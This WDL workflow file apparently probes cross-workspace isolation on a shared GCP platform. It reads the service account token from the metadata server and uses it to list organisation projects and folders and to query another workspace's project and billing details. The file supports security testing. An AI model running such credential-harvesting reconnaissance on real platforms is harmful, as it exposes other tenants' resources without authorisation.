version 1.0

workflow cross_workspace_test {
    call probe
}

task probe {
    command <<<
        TOKEN=$(curl -sf -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
          | sed 's/.*"access_token":"\([^"]*\)".*/\1/')

        echo "=== SA Email ==="
        curl -sf -H "Metadata-Flavor: Google" \
          "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email"

        echo ""
        echo "=== List projects in org (resourcemanager) ==="
        curl -s -H "Authorization: Bearer $TOKEN" \
          "https://cloudresourcemanager.googleapis.com/v1/projects?filter=parent.type%3Dorganization"

        echo ""
        echo "=== List ALL projects visible to SA ==="
        curl -s -H "Authorization: Bearer $TOKEN" \
          "https://cloudresourcemanager.googleapis.com/v1/projects?pageSize=100"

        echo ""
        echo "=== List projects v3 ==="
        curl -s -H "Authorization: Bearer $TOKEN" \
          "https://cloudresourcemanager.googleapis.com/v3/projects?pageSize=100"

        echo ""
        echo "=== Search projects ==="
        curl -s -H "Authorization: Bearer $TOKEN" \
          "https://cloudresourcemanager.googleapis.com/v3/projects:search" \
          -X POST -H "Content-Type: application/json" \
          -d '{"pageSize":100}'

        echo ""
        echo "=== List folders ==="
        curl -s -H "Authorization: Bearer $TOKEN" \
          "https://cloudresourcemanager.googleapis.com/v3/folders:search" \
          -X POST -H "Content-Type: application/json" \
          -d '{"pageSize":100}'

        echo ""
        echo "=== Get own project ==="
        curl -s -H "Authorization: Bearer $TOKEN" \
          "https://cloudresourcemanager.googleapis.com/v1/projects/wb-shiny-pumpkin-9044"

        echo ""
        echo "=== Get other project ==="
        curl -s -H "Authorization: Bearer $TOKEN" \
          "https://cloudresourcemanager.googleapis.com/v1/projects/wb-sparkly-turnip-3673"

        echo ""
        echo "=== Billing info own project ==="
        curl -s -H "Authorization: Bearer $TOKEN" \
          "https://cloudbilling.googleapis.com/v1/projects/wb-shiny-pumpkin-9044/billingInfo"

        echo ""
        echo "=== Billing info other project ==="
        curl -s -H "Authorization: Bearer $TOKEN" \
          "https://cloudbilling.googleapis.com/v1/projects/wb-sparkly-turnip-3673/billingInfo"
    >>>

    runtime {
        docker: "gcr.io/cloud-builders/curl"
        memory: "2 GB"
        cpu: 1
        disks: "local-disk 10 HDD"
    }

    output {
        String result = read_string(stdout())
    }
}
